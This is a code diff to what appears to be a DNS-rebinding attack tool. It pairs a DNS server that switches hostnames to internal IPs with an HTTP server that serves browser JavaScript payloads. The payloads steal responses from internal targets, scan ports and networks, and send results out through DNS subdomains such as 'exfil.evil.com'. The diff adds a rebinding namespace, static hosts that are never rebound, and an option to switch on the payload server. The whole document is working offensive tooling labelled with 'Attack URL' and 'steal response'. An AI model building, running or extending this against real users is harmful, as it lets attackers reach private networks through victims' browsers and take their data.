@@ -49,6 +49,7 @@ class PayloadGenerator:
         delay_ms: int = 3000,
         exfil_domain: Optional[str] = None,
         exfil_callback: Optional[str] = None,
+        rebinder_base: Optional[str] = None,
     ) -> str:
         """
         Generate payload to steal response from single target.
@@ -115,7 +116,10 @@ class PayloadGenerator:
     }};
     
     // Check if we need to redirect to unique subdomain for same-origin fetch
-    const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
+    // For browser rebinding attacks, we want a dedicated rebinding namespace like: *.rb.<domain>
+    // If rebinder_base is provided server-side, use it. Otherwise fall back to last 2 labels.
+    const rebinderBase = "{rebinder_base or ''}";
+    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
     const currentHost = window.location.hostname;
     const currentPort = window.location.port || '80';
     
@@ -220,6 +224,7 @@ class PayloadGenerator:
         ports: list[int],
         delay_ms: int = 3000,
         exfil_domain: Optional[str] = None,
+        rebinder_base: Optional[str] = None,
     ) -> str:
         """Generate payload to scan ports on rebind target."""
         
@@ -264,7 +269,8 @@ class PayloadGenerator:
         timeoutMs: 2000
     }};
     
-    const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
+    const rebinderBase = "{rebinder_base or ''}";
+    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
     const results = document.getElementById('results');
     const status = document.getElementById('status');
     
@@ -346,6 +352,7 @@ class PayloadGenerator:
         port: int = 80,
         delay_ms: int = 3000,
         exfil_domain: Optional[str] = None,
+        rebinder_base: Optional[str] = None,
     ) -> str:
         """
         Generate payload for network scanning.
@@ -393,7 +400,8 @@ class PayloadGenerator:
         timeoutMs: 2000
     }};
     
-    const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
+    const rebinderBase = "{rebinder_base or ''}";
+    const baseDomain = rebinderBase || window.location.hostname.split('.').slice(-2).join('.');
     const logEl = document.getElementById('log');
     const status = document.getElementById('status');
     const hostsEl = document.getElementById('hosts');
@@ -583,6 +591,7 @@ class PayloadPage(resource.Resource):
                 target_path=path,
                 delay_ms=delay,
                 exfil_domain=exfil,
+                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
             )
             
         elif self.path == 'portscan':
@@ -595,6 +604,7 @@ class PayloadPage(resource.Resource):
                 ports=ports,
                 delay_ms=delay,
                 exfil_domain=exfil,
+                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
             )
             
         elif self.path == 'netscan':
@@ -606,6 +616,7 @@ class PayloadPage(resource.Resource):
                 port=port,
                 delay_ms=delay,
                 exfil_domain=exfil,
+                rebinder_base=(cfg.rb_zone or f"rb.{domain}"),
             )
             
         else:
@@ -881,12 +892,19 @@ class ServerConfig:
     domain: str
     ttl: int = 0
     strategy: RebindStrategy = field(default_factory=lambda: CountStrategy(1))
+
+    # Hostnames that must NEVER be rebound (always return server_ip).
+    # This is critical when your zone is also used for other services (e.g. Interactsh)
+    # and you need a stable hostname to serve the initial browser payload.
+    static_hosts: list[str] = field(default_factory=list)
     
     # Exfiltration settings
     exfil_prefix: str = "exfil"  # e.g., data.exfil.evil.com
     
     # HTTP payload server
     http_port: int = 8080
+    enable_http: bool = False
+    rb_zone: str = ""  # e.g. rb.nsish.com (used by browser payload redirects)
     
     # Ranges to filter from logs (noisy resolvers)
     quiet_ranges: list = field(default_factory=lambda: [
@@ -908,6 +926,20 @@ class ServerConfig:
     
     def __post_init__(self):
         self.logger = Logger()
+        # Browser payload mode defaults (only when HTTP payload server is enabled)
+        if self.enable_http:
+            # Default rebinding namespace
+            if not self.rb_zone:
+                self.rb_zone = f"rb.{self.domain}"
+
+            # Default static hosts if none provided.
+            # - static.<domain>: stable payload host
+            if not self.static_hosts:
+                self.static_hosts = [f"static.{self.domain}"]
+
+        # normalize
+        self.rb_zone = (self.rb_zone or "").strip().lower().rstrip('.')
+        self.static_hosts = [h.strip().lower().rstrip('.') for h in self.static_hosts if h and h.strip()]
     
     @property
     def ns_prefixes(self) -> list:
@@ -935,12 +967,28 @@ class ServerConfig:
     def get_response_ip(self, hostname: str, source_ip: str = "unknown", 
                         source_port: int = 0) -> str:
         """Determine which IP to return for a hostname."""
-        hostname_lower = hostname.lower()
+        hostname_lower = hostname.lower().rstrip('.')
         
         # NS records always point to server
         for prefix in self.ns_prefixes:
             if hostname_lower.startswith(prefix.lower()):
                 return self.server_ip
+
+        # Static hosts must NEVER be rebound (serve initial payload reliably)
+        if hostname_lower in self.static_hosts:
+            # Note: do not increment query counters for static hosts
+            if self.logger:
+                self.logger.query(
+                    hostname=hostname,
+                    response_ip=self.server_ip,
+                    source_ip=source_ip,
+                    source_port=source_port,
+                    query_type="A",
+                    is_rebind=False,
+                    query_count=0,
+                    strategy="static-host"
+                )
+            return self.server_ip
         
         # Check for exfil data
         self.check_exfil(hostname_lower, source_ip)
@@ -1347,12 +1395,19 @@ def print_banner():
     print(f'  Server IP:       {config.server_ip}')
     print(f'  Domain:          {config.domain}')
     print(f'  DNS server:      0.0.0.0:{config.port}')
-    print(f'  HTTP payloads:   http://0.0.0.0:{config.http_port}/')
+    if config.enable_http:
+        print(f'  HTTP payloads:   http://0.0.0.0:{config.http_port}/')
+        print(f'  Rebind space:    *.{config.rb_zone or ("rb." + config.domain)}')
+        print(f'  Static host(s):  {", ".join(config.static_hosts) if config.static_hosts else "(none)"}')
+    else:
+        print(f'  HTTP payloads:   (disabled)  (enable with --http-enable)')
     print(f'  Strategy:        {config.strategy.describe()}')
     print(f'  Exfil domain:    *.{config.exfil_prefix}.{config.domain}')
-    print()
-    print(f'  \033[93m📋 Attack URL:\033[0m    http://attack.{config.domain}:{config.http_port}/single')
-    print()
+    if config.enable_http:
+        print()
+        print(f'  \033[93m📋 Payload URL (stable host):\033[0m  http://static.{config.domain}:{config.http_port}/single')
+        print(f'  \033[93m📋 Rebind namespace:\033[0m         http://rXXXX.{config.rb_zone}:{config.http_port}/ (auto)')
+        print()
     print(f'  Main log:        {config.logger.main_log}')
     print(f'  JSON log:        {config.logger.json_log}')
     print(f'  Exfil log:       {config.logger.exfil_log}')
@@ -1492,8 +1547,19 @@ def run_setup_wizard() -> argparse.Namespace:
     args.exfil_prefix = prompt("Exfil prefix", default="exfil")
     print()
     
-    print("  \033[1mHTTP port\033[0m: Port for payload HTTP server (browser attacks)")
-    args.http_port = int(prompt("HTTP port", default="8080"))
+    print("  \033[1mBrowser payload server\033[0m: Enable HTTP server for browser attack payloads?")
+    http_enable = prompt("Enable HTTP payloads? (y/N)", default="N").strip().lower() in ("y", "yes")
+    args.http_enable = bool(http_enable)
+    if args.http_enable:
+        print("  \033[1mHTTP port\033[0m: Port for payload HTTP server (browser attacks)")
+        args.http_port = int(prompt("HTTP port", default="8080"))
+        # Browser payload defaults: dedicated rebinding namespace
+        args.rb_zone = f"rb.{args.domain}"
+        args.static_hosts = f"static.{args.domain}"
+    else:
+        args.http_port = 8080
+        args.rb_zone = None
+        args.static_hosts = None
     print()
     
     args.ttl = 0  # Always 0 for rebinding
@@ -1506,7 +1572,11 @@ def run_setup_wizard() -> argparse.Namespace:
     print(f"    Server IP:     {args.server}")
     print(f"    Domain:        {args.domain}")
     print(f"    DNS port:      {args.port}")
-    print(f"    HTTP port:     {args.http_port}")
+    print(f"    HTTP payloads: {'enabled' if getattr(args,'http_enable',False) else 'disabled'}")
+    if getattr(args,'http_enable',False):
+        print(f"    HTTP port:     {args.http_port}")
+        print(f"    RB zone:       {args.rb_zone}")
+        print(f"    Static host:   {args.static_hosts}")
     print(f"    Strategy:      {args.strategy.describe()}")
     print(f"    Exfil domain:  *.{args.exfil_prefix}.{args.domain}")
     print()
@@ -1581,8 +1651,19 @@ Strategies:
     parser.add_argument('--strategy', nargs='+', default=['count', '1'],
                         help='Rebind strategy and options')
     parser.add_argument('--exfil-prefix', default='exfil', help='Exfil subdomain prefix')
+    parser.add_argument('--http-enable', action='store_true', help='Enable HTTP payload server (browser attack payloads)')
     parser.add_argument('--http-port', type=int, default=8080, help='HTTP payload server port (default: 8080)')
+    parser.add_argument('--rb-zone', default=None, help='Rebinding namespace for browser payload redirects (e.g. rb.nsish.com)')
     parser.add_argument('--ttl', type=int, default=0, help='DNS TTL (default: 0)')
+    parser.add_argument(
+        '--static-hosts',
+        default=None,
+        help=(
+            'Comma-separated hostnames to ALWAYS resolve to --server (never rebind). '
+            'Example: "static.nsish.com,cdn.nsish.com". If omitted, defaults include '
+            'apex plus static/cdn/assets/stage subdomains.'
+        ),
+    )
     
     args = parser.parse_args()
     
@@ -1642,6 +1723,10 @@ def main():
     
     args = parse_args()
     
+    static_hosts = []
+    if args.static_hosts:
+        static_hosts = [h.strip() for h in args.static_hosts.split(',') if h.strip()]
+
     config = ServerConfig(
         whitelist_ip=args.whitelist,
         rebind_ips=args.rebind,
@@ -1650,8 +1735,11 @@ def main():
         domain=args.domain,
         ttl=args.ttl,
         strategy=args.strategy,
+        static_hosts=static_hosts,
         exfil_prefix=args.exfil_prefix,
         http_port=args.http_port,
+        enable_http=bool(args.http_enable),
+        rb_zone=(args.rb_zone or ""),
     )
     
     print_banner()
@@ -1673,10 +1761,11 @@ def main():
     reactor.listenUDP(config.port, protocol)
     reactor.listenTCP(config.port, factory)
     
-    # Set up HTTP payload server
-    payload_root = PayloadResource(config)
-    payload_site = web_server.Site(payload_root)
-    reactor.listenTCP(config.http_port, payload_site)
+    # Set up HTTP payload server (optional)
+    if config.enable_http:
+        payload_root = PayloadResource(config)
+        payload_site = web_server.Site(payload_root)
+        reactor.listenTCP(config.http_port, payload_site)
     
     # Set up interactive command interface
     stdio.StandardIO(CommandProtocol())
